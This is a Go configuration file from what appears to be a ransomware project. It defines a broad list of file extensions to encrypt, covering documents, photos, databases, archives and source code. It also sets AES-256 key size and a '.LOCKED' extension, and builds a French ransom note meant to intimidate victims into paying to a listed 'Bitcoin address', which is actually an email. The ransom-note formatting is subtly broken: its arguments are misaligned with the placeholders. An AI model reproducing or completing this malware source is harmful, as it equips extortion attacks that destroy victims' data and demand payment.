


package config

import "fmt"

var (
	// Liste étendue pour une couverture maximale
	ExtForEncrypt = []string{
		".txt", ".pdf", ".docx", ".doc", ".xlsx", ".xls", ".pptx", ".ppt", ".odt", ".rtf",
		".jpg", ".jpeg", ".png", ".webp", ".gif", ".psd", ".ai", ".svg", ".raw",
		".mp4", ".mov", ".avi", ".mkv", ".mp3", ".wav", ".flac",
		".sql", ".db", ".sqlite", ".mdb", ".json", ".xml", ".csv",
		".zip", ".rar", ".7z", ".tar", ".gz", ".iso",
		".go", ".py", ".js", ".html", ".css", ".cpp", ".c", ".php", ".java",
	}

	MaxSize             = 50        // Limite à 50MB
	KeyByte             = 32        // AES-256
	ChangedToExtensions = ".LOCKED" 
    AuthorName          = "MR.ROBOT"
	GithubLink          = "https://github.com/StalkeRalp/RANSOMWARE.git"
	Version             = 1.0
	BitcoinAddress      = "nkadambatonga12@gmail.com"

	// Message professionnel et intimidant
	RansomwareMessage = fmt.Sprintf(
		"⚠️ ATTENTION : PROTOCOLE DE CHIFFREMENT ACTIVÉ ⚠️\n\n"+
			"Toutes vos données critiques ont été verrouillées par un algorithme de chiffrement militaire AES-256.\n\n"+
			"--- ÉTAT DU SYSTÈME ---\n"+
			"ID de la victime : #VIOLA-%s-7742\n"+
			"Statut des fichiers : CHIFFRÉS\n"+
			"Extension système : %s\n\n"+
			"--- PROCÉDURE DE RÉCUPÉRATION ---\n"+
			"1. Toute tentative de modification des fichiers entraînera une corruption irréversible.\n"+
			"2. Ne tentez pas d'utiliser des outils tiers ; cela détruira la structure de la clé.\n"+
			"3. Pour obtenir votre clé, transférez les frais de restauration à l'adresse suivante :\n\n"+
			"ADRESSE BITCOIN : %s\n\n"+
			"----------------------------------------------------------------\n"+
		AuthorName, ChangedToExtensions, BitcoinAddress, AuthorName,
	)
)